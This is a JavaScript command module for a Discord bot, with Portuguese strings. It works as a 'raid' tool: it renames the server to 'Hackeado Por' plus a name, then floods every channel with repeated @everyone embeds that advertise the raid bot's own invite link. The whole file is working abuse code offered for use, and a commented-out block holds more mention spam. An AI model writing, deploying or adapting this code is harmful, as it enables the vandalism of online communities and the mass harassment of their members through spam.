const discord = require("discord.js");

exports.run = async (client, message, args) => {
    let arg = args.slice(0).join(" ")
    if(!arg){
        arg = "Gustavo33"
    }
    console.log("Raid Executado No Servidor: " + message.guild.name + " | Quem Ordenou O Raid: " + message.author.username + ` | Id De ${message.author.username}: ${message.author.id}`)
    message.guild.setName(`Hackeado Por ${arg}`)
    let Title = `Hackeado Por: ${arg}`
    let Description = "@everyone @everyone @everyone @everyone @everyone @everyone"
    let field = "Quer Ter Esse Bot De Raid?:"
    let fieldd = "Servidor Do Bot: https://discord.gg/gF5pQ2" // descricão do field
    let footer = "Feito Por Gustavo33"
   const embed = new discord.RichEmbed()
   .setTitle(Title)
   .setColor("RANDOM")
   .setDescription(Description)
   .setImage("https://media.tenor.com/images/71656fc182ad63d50fbcd7c5496aa09d/tenor.gif")
   .addField(field, fieldd)
   .setFooter(footer)
   const embed0 = new discord.RichEmbed()
   .setTitle(Title)
   .setColor("RANDOM")
   .setDescription(Description)
   .setImage("https://media.tenor.com/images/71656fc182ad63d50fbcd7c5496aa09d/tenor.gif")
   .addField(field, fieldd)
   .setFooter(footer)
   const embed1 = new discord.RichEmbed()
   .setTitle(Title)
   .setColor("RANDOM")
   .setDescription(Description)
   .setImage("https://media.tenor.com/images/71656fc182ad63d50fbcd7c5496aa09d/tenor.gif")
   .addField(field, fieldd)
   .setFooter(footer)
   let canal = message.channel
   let guildid = message.guild.id;
   function msg(){
     client.guilds.get(message.guild.id).channels.forEach((canal) => {
        canal.send(embed)
        canal.send(embed0)
        canal.send(embed1)
        canal.send(embed)
        canal.send(embed0)
        canal.send(embed1)
        canal.send(embed)
        canal.send(embed0)
        canal.send(embed1)
        canal.send(embed)
        canal.send(embed0)
        canal.send(embed1)
        canal.send(embed)
        canal.send(embed0)
        canal.send(embed1)
     })
   }
   function msg1(){/*
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")
    canal.send("|| @everyone | @here ||")*/
   }
   function r2(){
       msg()
       msg1()
       msg()
       msg1()
       msg()
       msg1()
       msg()
       msg1()
       msg()
       msg1()
       msg()
       msg1()
       msg()
       msg1()
       msg()
       msg1()
       msg()
       msg1()
       msg()
       msg1()
       msg()
       msg1()
       msg()
       msg1()
       msg()
       msg()
       msg1()
       msg()
       msg1()
       msg()
       msg1()
       msg1()
       msg()
       msg()
       msg1()
       msg()
       msg()
       msg1()
       msg()
       msg1()
       msg()
       msg()
       msg1()
       msg()
       msg()
       msg()
   }
   function raid1(){
       r2()
       r2()
       r2()
       r2()
       r2()
       r2()
       r2()
       r2()
   }
   function raid(){
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
       raid1()
   }
   raid()
}